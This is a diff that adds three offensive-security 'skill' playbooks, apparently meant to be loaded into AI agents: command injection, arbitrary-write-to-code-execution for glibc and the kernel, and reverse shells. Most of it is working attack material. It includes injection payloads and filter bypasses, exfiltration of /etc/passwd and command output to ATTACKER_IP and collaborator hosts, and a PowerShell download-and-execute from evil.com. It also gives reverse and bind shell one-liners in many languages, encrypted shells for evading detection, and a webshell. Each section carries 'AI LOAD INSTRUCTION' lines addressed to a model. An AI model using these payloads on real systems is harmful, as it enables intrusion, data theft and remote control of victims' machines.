@@ -2623,3 +2623,945 @@ Cross-references:
 - **`hunt-aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
 - **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
 - **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.
+
+
+---
+
+## cmdi-command-injection
+
+# SKILL: Command Injection — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Command injection occurs when user input is passed to a shell command without sanitization. Covers all injection contexts, all major bypass techniques for filtered characters, and blind detection via timing/OOB. Base models often miss argument injection (injecting into command arguments, not the command itself) and the whitespace bypass variants.
+
+## 0. RELATED ROUTING
+
+- reverse-shell-techniques — after gaining command injection, escalate to reverse shell
+- ssrf-hunter — if command injection is in a URL-fetching context
+- path-traversal-lfi — often co-occurs with command injection in file processing
+
+---
+
+## 1. INJECTION CONTEXTS
+
+### 1.1 Direct Shell Injection (Most Exploitable)
+
+```bash
+# App does: system("ping " + user_input)
+# Injection:
+; whoami
+& whoami
+| whoami
+&& whoami
+|| whoami
+`whoami`
+$(whoami)
+```
+
+### 1.2 PHP Command Execution Functions
+
+```php
+exec(), system(), shell_exec(), passthru(), popen()
+proc_open(), pcntl_exec()
+# Also: eval() with PHP code
+```
+
+### 1.3 Python Command Execution
+
+```python
+os.system(user_input)
+os.popen(user_input)
+subprocess.call(user_input, shell=True)  # shell=True is key
+subprocess.Popen(user_input, shell=True)
+# SAFE: subprocess.call(['cmd', 'arg1', arg2]) — no shell=True
+```
+
+---
+
+## 2. INJECTION OPERATORS
+
+| Operator | Behavior | Example |
+|---|---|---|
+| `;` | Separator — run A then B | `ping localhost; whoami` |
+| `&&` | AND — run B only if A succeeds | `true && whoami` |
+| `\|\|` | OR — run B only if A fails | `false \|\| whoami` |
+| `\|` | Pipe — A's output to B | `echo test \| whoami` (whoami ignores stdin) |
+| `\`` (backtick) | Subshell inline | `` ping `whoami`.attacker.com `` |
+| `$()` | Subshell inline | `ping $(whoami).attacker.com` |
+| `\n` (newline) | Command separator | `ping\nwhoami` |
+| `%0a` (URL-encoded newline) | Command separator in URLs | `GET /?host=localhost%0awhoami` |
+
+---
+
+## 3. BLIND COMMAND INJECTION
+
+When there's no output visible in the response.
+
+### Time-Based Detection
+
+```bash
+# Linux — sleep 10 seconds if injection works:
+; sleep 10
+&& sleep 10
+| sleep 10
+$(sleep 10)
+`sleep 10`
+' ; sleep 10 ;'
+127.0.0.1 && sleep 10 #
+
+# Windows:
+& timeout /t 10
+& ping -n 10 127.0.0.1
+```
+
+### Out-of-Band (DNS) Detection
+
+```bash
+# Using Burp Collaborator or interactsh:
+; nslookup `whoami`.BURP_COLLABORATOR.com
+; curl http://BURP_COLLABORATOR.com/$(whoami)
+; wget http://BURP_COLLABORATOR.com/?x=$(id|base64)
+$(nslookup $(whoami).COLLABORATOR.com)
+```
+
+### Out-of-Band (HTTP) Exfiltration
+
+```bash
+# Exfiltrate command output via HTTP request:
+; curl -d "output=$(id)" http://ATTACKER_IP/collect
+; wget "http://ATTACKER_IP/collect?data=$(cat /etc/passwd | base64)"
+```
+
+---
+
+## 4. FILTER BYPASS TECHNIQUES
+
+### 4.1 Without Spaces
+
+```bash
+# Using $IFS (Internal Field Separator = space by default)
+cat$IFS/etc/passwd
+ls$IFS-la
+
+# Using brace expansion
+{cat,/etc/passwd}
+{ls,-la,/}
+
+# Using tabs
+cat	/etc/passwd     # \t instead of space
+
+# Using redirect
+cat</etc/passwd
+cat<>/etc/passwd
+```
+
+### 4.2 Without Quotes
+
+```bash
+# Single-char commands that don't need quotes
+cat /etc/passwd
+# Using wildcards
+cat /etc/pa??wd
+cat /etc/pass*
+cat /etc/p?ss?d
+```
+
+### 4.3 Blacklisted Keywords
+
+```bash
+# Keyword: "cat" blocked
+# Alternatives:
+more /etc/passwd
+less /etc/passwd
+head /etc/passwd
+tail /etc/passwd
+rev /etc/passwd | rev    # rev reverses, double-rev restores
+od -c /etc/passwd         # octal dump
+xxd /etc/passwd           # hex dump
+strings /etc/passwd
+tac /etc/passwd           # reverse cat
+
+# Keyword: "whoami" blocked
+id
+w
+who
+```
+
+### 4.4 Character Encoding Bypass
+
+```bash
+# Hex encoding
+echo -e '\x77\x68\x6f\x61\x6d\x69' | bash    # whoami
+$(echo 77686f616d69 | xxd -r -p)              # whoami via hex
+
+# Base64
+echo d2hvYW1p | base64 -d | bash               # whoami
+
+# Using printf
+printf '\167\150\157\141\155\151' | bash       # octal whoami
+
+# Using variables
+x=who;a=ami;$x$a    # whoami split across variables
+w$@ho$@ami           # Using $@ (empty string by default)
+```
+
+### 4.5 Slash Bypass
+
+```bash
+# When / is filtered:
+cat ${PATH%%u*}etc${PATH%%u*}passwd
+# or
+echo "cat /etc/passwd" | sed 's/X/\//g' | bash  # if X → /
+
+# Using environment variables containing /
+${HOME%/root}/etc/passwd    # if HOME=/root → /etc/passwd
+```
+
+---
+
+## 5. ARGUMENT INJECTION
+
+Injecting into command arguments (not adding new commands) to achieve unexpected behavior.
+
+### Git Argument Injection
+
+```bash
+# App does: git clone $user_input
+# Inject: --upload-pack=calc.exe (Windows) or:
+--upload-pack=touch /tmp/pwned
+# Or: 
+-u /tmp/evil.sh
+```
+
+### cURL Argument Injection
+
+```bash
+# App does: curl $user_input
+# SSRF via flag injection:
+-o /var/www/html/shell.php http://attacker.com/shell.php
+-F file=@/etc/passwd http://attacker.com/collect
+--config /etc/evil.curlrc
+
+# Example in URL input: 
+http://target.com/fetch?url=http://localhost/admin+-o+/var/www/html/evil.php+http://attacker.com/webshell.php
+```
+
+### Rsync Argument Injection
+
+```bash
+# App does: rsync $src $dst
+# Inject via -e flag (custom rsh):
+-e 'sh -c "id > /tmp/out"' /dev/null .
+```
+
+### ffmpeg Argument Injection
+
+```bash
+# Server-side video processing with SSRF via HLS:
+-i http://SSRF_target/secret.m3u8
+```
+
+---
+
+## 6. PLATFORM-SPECIFIC PATTERNS
+
+### Windows Command Injection
+
+```batch
+# Separators:
+& dir
+&& dir
+| dir
+%0a dir
+
+# Operators without space:
+dir,C:\
+dir/s/b+C:\
+
+# Env var tricks:
+%COMSPEC% /c whoami
+cmd /c whoami
+```
+
+### PowerShell Injection
+
+```powershell
+# Common PowerShell one-liners for CMDi:
+; powershell -c "whoami"
+; powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')
+```
+
+---
+
+## 7. AUTOMATED DETECTION
+
+### CommixTool
+
+```bash
+# Automated command injection detection and exploitation:
+python3 commix.py -u "https://target.com/vuln?param=test" --all
+python3 commix.py --url="https://target.com" --data="ip=127.0.0.1&submit=ping"
+python3 commix.py --url "https://target.com/vuln" -p "param" --os-cmd="id"
+```
+
+---
+
+## 8. TESTING CHECKLIST
+
+```
+□ Map all parameters that might be passed to OS commands
+□ Test with ;id, &&id, |id (look for id output in response)
+□ Test time-based: ; sleep 10 (look for 10-second delay)
+□ Test OOB: ; nslookup BURP_COLLABORATOR.com
+□ If semicolons blocked, try &&, ||, |, \n, %0a
+□ If spaces blocked, try $IFS, {cmd,arg}, <, tabs
+□ Check if cat/ls/etc. blocked → try alternatives
+□ Test argument injection in file paths, URLs, identifiers
+□ Test Windows-specific operators on Windows targets (&, &&, |)
+□ Automate with commix for comprehensive coverage
+```
+
+---
+
+## 9. QUICK PAYLOAD REFERENCE
+
+```bash
+# Top 10 initial probes:
+; whoami
+& whoami
+| whoami
+`whoami`
+$(whoami)
+%26whoami
+%3Bwhoami
+127.0.0.1;whoami
+1;id
+' || id || '
+
+# Blind time-based:
+; sleep 10
+&& sleep 10
+| sleep 10
+127.0.0.1 && sleep 10 #
+
+# OOB (replace COLLAB with Burp Collaborator):
+; curl COLLAB
+; nslookup COLLAB
+; ping -c 1 COLLAB
+```
+
+
+
+---
+
+## arbitrary-write-to-rce
+
+# SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert techniques for converting an arbitrary write primitive into code execution. Covers every major overwrite target organized by glibc version compatibility: GOT, __malloc_hook, __free_hook, _IO_FILE vtable, __exit_funcs, TLS_dtor_list, _dl_fini, modprobe_path, .fini_array, C++ vtable, and setcontext gadget. This is the "last mile" skill. Base models often target hooks that no longer exist (post-glibc 2.34) or miss pointer mangling requirements.
+
+## 0. RELATED ROUTING
+
+- heap-exploitation — obtaining the arbitrary write via heap attacks
+- heap-exploitation/IO_FILE_EXPLOITATION.md — deep _IO_FILE structure exploitation
+
+---
+
+## 1. TARGET SELECTION BY GLIBC VERSION
+
+| Target | glibc < 2.24 | 2.24–2.33 | ≥ 2.34 | Required Knowledge |
+|---|---|---|---|---|
+| GOT overwrite | OK (Partial RELRO) | OK (Partial RELRO) | OK (Partial RELRO) | Binary base |
+| `__malloc_hook` | OK | OK | **Removed** | libc base |
+| `__free_hook` | OK | OK | **Removed** | libc base |
+| `__realloc_hook` | OK | OK | **Removed** | libc base |
+| `_IO_FILE` vtable (direct) | OK | Vtable range check | Vtable range check | libc base + heap |
+| `_IO_FILE` via `_IO_str_jumps` | N/A | OK (2.24–2.27) | Patched | libc base + heap |
+| `_IO_FILE` via `_IO_wfile_jumps` | N/A | OK (≥ 2.28) | OK | libc base + heap |
+| `__exit_funcs` | OK | OK | OK | libc base + pointer guard |
+| `TLS_dtor_list` | N/A | N/A | OK | TLS addr + pointer guard |
+| `_dl_fini` / link_map | OK | OK | OK | ld.so base |
+| `modprobe_path` (kernel) | OK | OK | OK | Kernel base |
+| `.fini_array` | OK | OK | OK | Binary base (if writable) |
+| C++ vtable | OK | OK | OK | Object address + heap |
+| `setcontext` gadget | OK | OK (changed in 2.29) | OK | libc base |
+| Stack return address | Always | Always | Always | Stack address |
+
+---
+
+## 2. GOT OVERWRITE
+
+**Replace a function pointer in the Global Offset Table.**
+
+### Requirements
+- Partial RELRO (`.got.plt` writable) — Full RELRO blocks this entirely
+
+### Common Targets
+
+| Overwrite From | Overwrite To | Trigger |
+|---|---|---|
+| `printf@GOT` | `system` | Next `printf(user_input)` with input = `/bin/sh` |
+| `free@GOT` | `system` | Next `free(ptr)` where ptr points to `"/bin/sh"` |
+| `strlen@GOT` | `system` | Next `strlen(user_input)` |
+| `atoi@GOT` | `system` | Next `atoi(user_input)` with input = `"sh"` |
+| `puts@GOT` | `system` | Next `puts(user_input)` |
+| `exit@GOT` | `main` or gadget | Create loop for multi-shot exploit |
+| `__stack_chk_fail@GOT` | `ret` gadget | Neutralize canary check |
+
+```python
+# Format string GOT overwrite
+from pwn import fmtstr_payload
+payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})
+
+# Heap-based GOT overwrite (tcache poisoning)
+# Allocate chunk at GOT address → write system address
+```
+
+---
+
+## 3. __malloc_hook / __free_hook (glibc < 2.34)
+
+### __malloc_hook
+
+```python
+# Overwrite __malloc_hook with one_gadget address
+# Triggered by any malloc call (including internal malloc in printf with large format)
+write(libc.sym['__malloc_hook'], one_gadget_addr)
+# Trigger:
+io.sendline('%100000c')  # printf calls malloc internally for large format
+```
+
+### __free_hook
+
+```python
+# Overwrite __free_hook with system
+write(libc.sym['__free_hook'], libc.sym['system'])
+# Trigger: free a chunk containing "/bin/sh"
+chunk_data = b'/bin/sh\x00'
+# ... allocate chunk with this data, then free it
+```
+
+### Realloc Trick for one_gadget Constraints
+
+```python
+# one_gadget often requires specific register/stack state
+# realloc pushes registers and adjusts stack before calling __realloc_hook
+# Set __malloc_hook = realloc+N (skip some pushes to adjust stack alignment)
+# Set __realloc_hook = one_gadget
+write(libc.sym['__realloc_hook'], one_gadget)
+write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust
+```
+
+---
+
+## 4. _IO_FILE VTABLE
+
+### Quick Summary by Version
+
+| glibc | Method | Vtable Target |
+|---|---|---|
+| < 2.24 | Direct vtable overwrite | Point vtable to fake table with `system` at `__overflow` offset |
+| 2.24–2.27 | `_IO_str_jumps` | Within valid range; `_IO_str_finish` calls `_s._free_buffer` |
+| ≥ 2.28 | `_IO_wfile_jumps` | Wide-char path: `_wide_data->_wide_vtable` not range-checked |
+| ≥ 2.35 | House of Cat | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → fake wide vtable call |
+
+### FSOP Trigger
+
+```python
+# Overwrite _IO_list_all → fake FILE with crafted vtable
+# Trigger via exit() or malloc abort → _IO_flush_all_lockp → _IO_OVERFLOW
+```
+
+---
+
+## 5. __exit_funcs / __atexit
+
+```c
+// __exit_funcs is a linked list of function pointer entries called during exit()
+// Each entry contains a flavor (cxa, on, at) and a function pointer
+// Function pointers are MANGLED with pointer guard:
+//   stored = ROL(ptr ^ __pointer_chk_guard, 0x11)
+```
+
+### Exploitation
+
+```python
+# Need: libc base + __pointer_chk_guard value (at fs:[0x30] or leaked)
+# 1. Leak or brute-force pointer_guard
+# 2. Compute mangled function pointer:
+import struct
+def mangle(ptr, guard):
+    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff
+
+# 3. Write mangled one_gadget/system to __exit_funcs entry
+# 4. Trigger: call exit() or return from main
+```
+
+### Without Pointer Guard Knowledge
+
+If you can overwrite both the function pointer AND the pointer guard (in TLS at `fs:[0x30]`):
+1. Set pointer guard to 0
+2. Set function pointer to `ROL(target, 0x11)`
+3. Demangling: `ROR(stored, 0x11) ^ 0 = ROR(ROL(target, 0x11), 0x11) = target`
+
+---
+
+## 6. TLS_dtor_list (glibc ≥ 2.34)
+
+**Thread-local destructor list — the primary post-2.34 target.**
+
+```c
+// Called during __call_tls_dtors() in exit flow
+// Each entry: { void (*func)(void *), void *obj, void *next }
+// func is MANGLED same as exit_funcs (PTR_DEMANGLE)
+```
+
+### Location
+
+```
+TLS area (pointed by fs register on x86-64)
+tls_dtor_list is a thread-local variable in libc
+Typically at fs:[offset] — offset found via libc symbol or brute-force
+```
+
+### Exploitation
+
+```python
+# 1. Leak TLS base address (e.g., via canary leak: canary at fs:[0x28])
+# 2. Compute tls_dtor_list address
+# 3. Forge a tls_dtor_list entry:
+entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)
+entry += p64(arg_value)         # obj (passed as argument to func)
+entry += p64(0)                 # next = NULL (end of list)
+# 4. Write entry to heap, set tls_dtor_list to point to it
+# 5. Trigger: exit() → __call_tls_dtors() → func(obj)
+```
+
+---
+
+## 7. _dl_fini / LINK_MAP CORRUPTION
+
+### Attack Vector
+
+During `exit()`, `_dl_fini` iterates the link_map list and calls `DT_FINI_ARRAY` entries.
+
+```c
+// In _dl_fini:
+for each loaded library (link_map entry):
+    if l_info[DT_FINI_ARRAY]:
+        array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
+        for each entry in array:
+            entry()  // call destructor
+```
+
+### Exploitation
+
+1. Corrupt a `link_map` entry's `l_addr` (relocation base) to shift the FINI_ARRAY pointer
+2. Or corrupt `l_info[DT_FINI_ARRAY]` to point to fake array
+3. Fake array contains target function pointer (system, one_gadget)
+4. Trigger: `exit()` → `_dl_fini` → calls fake destructor
+
+**Advantage**: No pointer mangling (function pointers in FINI_ARRAY are not mangled).
+
+---
+
+## 8. modprobe_path (KERNEL)
+
+**Overwrite the kernel's `modprobe_path` to execute arbitrary commands as root.**
+
+```python
+# 1. Arbitrary kernel write: overwrite modprobe_path ("/sbin/modprobe")
+#    with "/tmp/x" (attacker's script)
+kernel_write(modprobe_path_addr, b'/tmp/x\x00')
+
+# 2. Prepare script:
+# echo '#!/bin/sh' > /tmp/x
+# echo 'cat /flag > /tmp/output' >> /tmp/x
+# chmod +x /tmp/x
+
+# 3. Trigger: execute a file with unknown binary format
+# echo -ne '\xff\xff\xff\xff' > /tmp/trigger
+# chmod +x /tmp/trigger
+# /tmp/trigger
+# → kernel calls modprobe_path ("/tmp/x") as root
+```
+
+---
+
+## 9. .fini_array
+
+**Overwrite destructor function pointers called during normal program exit.**
+
+```python
+# .fini_array contains function pointers called in reverse order during exit
+# Typically: [__do_global_dtors_aux, ...]
+# Overwrite first entry with target (main for loop, system for RCE)
+
+# Two-stage: .fini_array[0] = main (loop back), .fini_array[1] = <exploit_func>
+# First exit: calls .fini_array[1] (exploit_func), then .fini_array[0] (main)
+# In main loop: set up final exploit
+```
+
+**Limitation**: `.fini_array` may be read-only in Full RELRO binaries.
+
+---
+
+## 10. C++ VTABLE OVERWRITE
+
+```cpp
+// C++ objects with virtual functions have a vptr at offset 0
+// vptr → vtable → array of function pointers
+// Overwrite vptr to point to fake vtable with controlled function pointers
+
+// Object layout:
+// +0x00: vptr → [vtable_entry_0, vtable_entry_1, ...]
+// +0x08: member data...
+```
+
+```python
+# 1. Leak object address and vptr
+# 2. Create fake vtable in controlled memory:
+fake_vtable = p64(0)              # offset -0x10 (RTTI info)
+fake_vtable += p64(0)             # offset -0x08 (RTTI info)
+fake_vtable += p64(target_func)   # virtual function 0 → system / one_gadget
+fake_vtable += p64(target_func)   # virtual function 1
+# 3. Overwrite vptr to point to fake_vtable + 0x10 (skip RTTI prefix)
+# 4. Trigger: call virtual function on the object
+```
+
+---
+
+## 11. setcontext GADGET
+
+`setcontext` in libc loads registers from a `ucontext_t` structure — useful as a pivot gadget.
+
+### glibc < 2.29
+
+```c
+// setcontext+53: loads registers from [rdi + offsets]
+// RDI = first argument = pointer to controlled buffer
+// Sets RSP, RIP, and all other registers → full control
+```
+
+### glibc ≥ 2.29
+
+```c
+// setcontext+61: loads registers from [rdx + offsets]
+// Must control RDX, not RDI
+// Need an intermediate gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]
+```
+
+```python
+# Common pattern with __free_hook (pre-2.34):
+# __free_hook = setcontext + 61
+# free(chunk) → setcontext(chunk) where chunk contains fake ucontext
+# From ucontext: set RSP to ROP chain, RIP to ret → ROP continues
+
+# Post-2.34: combine with _IO_FILE exploitation
+# _IO_FILE vtable call passes fp as first arg → use gadget to move to rdx → setcontext
+```
+
+---
+
+## 12. DECISION TREE
+
+```
+You have an arbitrary write primitive. What to target?
+
+├── What's the RELRO level?
+│   ├── None / Partial → GOT overwrite (simplest, most reliable)
+│   │   └── printf→system, free→system, atoi→system
+│   └── Full RELRO → GOT read-only, choose alternative:
+│
+├── What glibc version?
+│   ├── < 2.34 (hooks available)
+│   │   ├── __free_hook = system → free("/bin/sh") [easiest]
+│   │   ├── __malloc_hook = one_gadget → trigger malloc [if constraints met]
+│   │   └── __realloc_hook + __malloc_hook realloc trick [adjust stack alignment]
+│   │
+│   ├── ≥ 2.34 (no hooks)
+│   │   ├── Know pointer guard (fs:[0x30])?
+│   │   │   ├── YES → __exit_funcs or TLS_dtor_list
+│   │   │   └── NO → overwrite pointer guard to 0 first, then exit_funcs
+│   │   ├── _IO_FILE + _IO_wfile_jumps (House of Apple 2 / Cat)
+│   │   │   └── Need: libc base + heap address + controllable FILE structure
+│   │   ├── _dl_fini link_map corruption
+│   │   │   └── Need: ld.so base address
+│   │   └── .fini_array (if writable)
+│   │       └── Need: binary base (no PIE, or PIE base leaked)
+│   │
+│   └── Any version
+│       ├── Stack return address (if stack address known)
+│       └── C++ vtable (if targeting C++ object with virtual functions)
+│
+├── Kernel write primitive?
+│   ├── modprobe_path (simplest kernel→root)
+│   ├── core_pattern (/proc/sys/kernel/core_pattern)
+│   └── Direct cred structure overwrite
+│
+└── Need to chain read → write → execute?
+    └── setcontext gadget: arbitrary write → pivot RSP → ROP chain
+        ├── glibc < 2.29: setcontext+53 (uses RDI)
+        └── glibc ≥ 2.29: setcontext+61 (uses RDX, need mov rdx, [rdi] gadget)
+```
+
+
+
+---
+
+## reverse-shell-techniques
+
+# SKILL: Reverse Shell Techniques — Expert Playbook
+
+> **AI LOAD INSTRUCTION**: Covers every major reverse shell one-liner variant, shell upgrade/stabilization procedures, bind shells, encrypted channels, and common firewall bypass techniques. Base models often give outdated one-liners that fail on specific systems or miss the shell upgrade step entirely.
+
+## 0. RELATED ROUTING
+
+- cmdi-command-injection — for getting the initial command execution
+- arbitrary-write-to-rce — for escalating a write primitive to execute a reverse shell
+- upload-insecure-files — webshell to reverse shell escalation
+
+---
+
+## 1. LISTENER SETUP (ATTACKER SIDE)
+
+```bash
+# Standard netcat listener
+nc -lvnp 4444
+
+# Rlwrap for arrow keys / history (recommended)
+rlwrap nc -lvnp 4444
+
+# Socat (better TTY support)
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+---
+
+## 2. BASH REVERSE SHELLS
+
+```bash
+# Standard bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Without -i (sometimes needed)
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+
+# Exec variant (avoids process name issues)
+exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# URL-encoded (for web injection)
+bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'
+
+# Base64 encoded (bypass filters)
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash
+
+# /dev/tcp not available? Use curl/wget:
+curl http://ATTACKER_IP:4444 | bash
+wget -qO- http://ATTACKER_IP:4444/shell.sh | bash
+```
+
+---
+
+## 3. PYTHON REVERSE SHELLS
+
+```python
+# Python 3
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Python 2
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PTY shell (fully interactive)
+python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in [0,1,2]];pty.spawn("/bin/bash")'
+```
+
+---
+
+## 4. PHP REVERSE SHELLS
+
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
+
+# One-liner
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Proc_open variant
+php -r '$s=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
+```
+
+---
+
+## 5. POWERSHELL REVERSE SHELLS (WINDOWS)
+
+```powershell
+# Standard PowerShell reverse shell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Base64 encoded command (avoid quotes in web exploits)
+$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$encoded = [Convert]::ToBase64String($bytes)
+powershell -EncodedCommand $encoded
+```
+
+---
+
+## 6. OTHER LANGUAGES
+
+```ruby
+# Ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Netcat
+nc -e /bin/sh ATTACKER_IP 4444
+# If -e not available:
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
+
+# Java (for JSP/servlet injection)
+Runtime r = Runtime.getRuntime();
+String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"};
+Process p = r.exec(commands);
+
+# NodeJS
+(function(){
+    var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4444, "ATTACKER_IP", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+```
+
+---
+
+## 7. SHELL UPGRADE / STABILIZATION
+
+After getting a dumb shell (no autocomplete, no arrow keys, ctrl+C kills shell):
+
+### Method 1: Python PTY (Most Common)
+
+```bash
+# Step 1: Spawn PTY
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Or: python -c 'import pty;pty.spawn("/bin/bash")'
+# Or: script -qc /bin/bash /dev/null
+
+# Step 2: Background and configure local terminal
+# Ctrl+Z to background
+stty raw -echo; fg
+
+# Step 3: Set terminal size (get your local dimensions first)
+# In LOCAL terminal: stty size → rows cols
+# In SHELL: 
+stty rows 50 columns 220
+export TERM=xterm-256color
+```
+
+### Method 2: Socat (Best Quality)
+
+```bash
+# Attacker: start socat listener
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# Victim: connect back with socat
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
+# If socat not installed: download static binary
+wget http://ATTACKER_IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat ...
+```
+
+### Method 3: Script Command
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+---
+
+## 8. BIND SHELLS (Target connects, attacker connects in)
+
+When outbound connections from target are firewalled:
+
+```bash
+# Netcat bind shell (listen on target)
+nc -lvnp 4444 -e /bin/bash
+# If -e not available:
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f
+
+# Python bind shell
+python3 -c 'import socket,subprocess;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();[subprocess.call("/bin/bash",shell=True,stdin=c,stdout=c,stderr=c)]'
+
+# Attacker connects to victim
+nc VICTIM_IP 4444
+```
+
+---
+
+## 9. ENCRYPTED SHELLS (SOCAT TLS)
+
+Bypass network detection / SSL inspection:
+
+```bash
+# Generate certificate (attacker)
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 1 -out shell.crt
+cat shell.crt shell.key > shell.pem
+
+# Listener (attacker)
+socat openssl-listen:4444,cert=shell.pem,verify=0 file:`tty`,raw,echo=0
+
+# Connect (victim)
+socat openssl-connect:ATTACKER_IP:4444,verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+---
+
+## 10. FIREWALL EVASION
+
+```bash
+# Use common ports (80, 443, 8080, 53)
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+
+# DNS-over-TCP (port 53) — often allowed outbound
+bash -i >& /dev/tcp/ATTACKER_IP/53 0>&1
+
+# ICMP tunnel (if only ICMP allowed):
+# Install: ptunnel or icmptunnel
+# Tunnel TCP over ICMP packets
+
+# HTTP tunnel via proxy
+# Use proxychains if HTTP proxy available
+```
+
+---
+
+## 11. WEBSHELL TO REVERSE SHELL
+
+```php
+<?php system($_GET['cmd']); ?>
+# Access: http://target/shell.php?cmd=nc+-e+/bin/sh+ATTACKER_IP+4444
+
+# Or POST-based:
+<?php echo system($_POST['cmd']); ?>
+```
+
+---
+
+## 12. QUICK REFERENCE — SHELL SELECTION
+
+| Situation | Best Choice |
+|---|---|
+| Linux target, bash available | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
+| No /dev/tcp (Debian/Ubuntu) | Python or Perl |
+| PHP web server | PHP exec() with bash one-liner |
+| Windows target | PowerShell encoded command |
+| Restricted environment | Socat static binary |
+| High OpSec needed | Socat TLS encrypted |
+| Fully interactive needed | Python PTY + stty stabilization |
+
